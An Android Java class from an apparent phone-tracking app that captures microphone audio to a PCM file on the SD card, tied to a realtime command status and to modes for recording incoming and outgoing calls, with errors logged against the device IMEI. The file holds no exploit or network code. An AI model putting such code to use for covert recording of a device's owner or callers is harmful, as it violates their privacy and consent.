package vn.vhc.live;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Looper;

public class MediaManagerCall {

	public static MediaManagerCall _instance;
	public static MediaManagerCall getInstance()
	{		
		if(_instance==null)_instance= new MediaManagerCall();
		return _instance;
	}	
	
	private static final int RECORDER_SAMPLERATE = 44100;//11025;// 44100, 22050 , 11025,8000
	private static final int RECORDER_CHANNELS = AudioFormat.CHANNEL_IN_MONO;
	private static final int RECORDER_AUDIO_ENCODING = AudioFormat.ENCODING_DEFAULT;//.ENCODING_PCM_16BIT;
	private static int BufferElements2Rec = 1024; // want to play 2048 (2K) since 2 bytes we use only 1024
	private static int BytesPerElement = 2; // 2 bytes in 16bit format
	
	private AudioRecord recorder;
	
	public static boolean isCalling=false;//0:normal;1: record calling	
	public static int modeRecord=1;//0:normal;1: record calling	
	public static String timeTracking="";//0:normal;1: record call incoming;2: record call outcoming
	public static boolean isStarting=false;//lock
	private boolean isRecording = false;
	private Thread recordingThread = null;
	
	public void  startRecordAudio()
	{
			try
			{
				
				if(isStarting) return;
				if(APTrackerService.statusCmdRealtime.equals(TypeCmd.PROCESSING))
				{
					return;
				}
				isStarting=true;
				UIManager.getInstance().showMsgXXX("Starting Record Audio");
				UtilGame.isBusy=true;
				APTrackerService.timeStartRealTime= new Date();
				
				
				recorder =  new AudioRecord(MediaRecorder.AudioSource.MIC,
			            RECORDER_SAMPLERATE, RECORDER_CHANNELS,
			            RECORDER_AUDIO_ENCODING, BufferElements2Rec * BytesPerElement);
				
			    recorder.startRecording();
			    isRecording = true;
			    APTrackerService.statusCmdRealtime=TypeCmd.PROCESSING;
			    recordingThread = new Thread(new Runnable() {
			        public void run() {
			            writeAudioDataToFile();
			        }
			    }, "AudioRecorder Thread");
			    recordingThread.start();
			}
			catch(Exception exxxx)
			{
				UIManager.getInstance().showMsgXXX("Exxxx3:"+exxxx.toString());
				
				UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
						"StartRecordAudio:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				
			}
	}
	
	private AudioRecord openAudio()
	{
		// This is really ugly but this is another area where Android falls down.
		// I bet on the iPhone you can enumerate the supported sampling rates.
		// Actually they probably just tell you which are supported. Anyway, we shall try:
		// 
		// 44100, 22050, 16000, 11025, 8000.
		int[] samplingRates = {44100, 22050, 16000, 11025, 8000};
		
		for (int i = 0; i < samplingRates.length; ++i)
		{
			try
			{
				int min = AudioRecord.getMinBufferSize(samplingRates[i], 
						AudioFormat.CHANNEL_IN_STEREO, 
						AudioFormat.ENCODING_DEFAULT);
				if (min < 4096)
					min = 4096;
				AudioRecord record = new AudioRecord(MediaRecorder.AudioSource.MIC, samplingRates[i],
						AudioFormat.CHANNEL_IN_STEREO, AudioFormat.ENCODING_DEFAULT,	min);
				if (record.getState() == AudioRecord.STATE_INITIALIZED)
				{
					//Log.d("Recorder", "Audio recorder initialised at " + record.getSampleRate());
					return record;
				}
				record.release();
				record = null;
			}
			catch (IllegalArgumentException e)
			{
				// Meh. Try the next one.
			}
		}
		// None worked.
		return null;
	}
	
	   //convert short to byte
	private byte[] short2byte(short[] sData) {
	    int shortArrsize = sData.length;
	    byte[] bytes = new byte[shortArrsize * 2];
	    for (int i = 0; i < shortArrsize; i++) {
	        bytes[i * 2] = (byte) (sData[i] & 0x00FF);
	        bytes[(i * 2) + 1] = (byte) (sData[i] >> 8);
	        sData[i] = 0;
	    }
	    return bytes;

	}

	private void writeAudioDataToFile() 
	{
	    // Write the output audio in byte
	    String filePath = "/sdcard/calltest.pcm";
	    short sData[] = new short[BufferElements2Rec];

	    FileOutputStream os = null;
	    try {
	    	File f= new File(filePath);
	    	if(!f.exists()) f.delete();
	    	if(!f.exists()) f.createNewFile();
	    	
	        os = new FileOutputStream(filePath);
	    } catch (Exception e) 
	    {
	        e.printStackTrace();
	    }

	    while (isRecording)
	    {
	        // gets the voice output from microphone to byte format
	        recorder.read(sData, 0, BufferElements2Rec);
	        System.out.println("Short wirting to file" + sData.toString());
	        try {
	            // // writes the data to file from buffer
	            // // stores the voice buffer
	            byte bData[] = short2byte(sData);
	            os.write(bData, 0, BufferElements2Rec * BytesPerElement);
	        } catch (IOException e) {
	            e.printStackTrace();
	            UIManager.getInstance().showMsgXXX("IOException1:"+e.toString());
	        }
	    }
	    try {
	        os.close();
	    } catch (IOException e) {
	    	UIManager.getInstance().showMsgXXX("IOException2:"+e.toString());
			
	        e.printStackTrace();
	    }
	}
	public void stopRecordAudio() 
	{
		isStarting=false;
		isRecording = false;
	    // stops the recording activity
	    if (null != recorder)
	    {
	        recorder.stop();
	        recorder.release();
	        recorder = null;
	        recordingThread = null;
	    }
	    UIManager.getInstance().showMsgXXX("stopRecordAudio");
	}
}
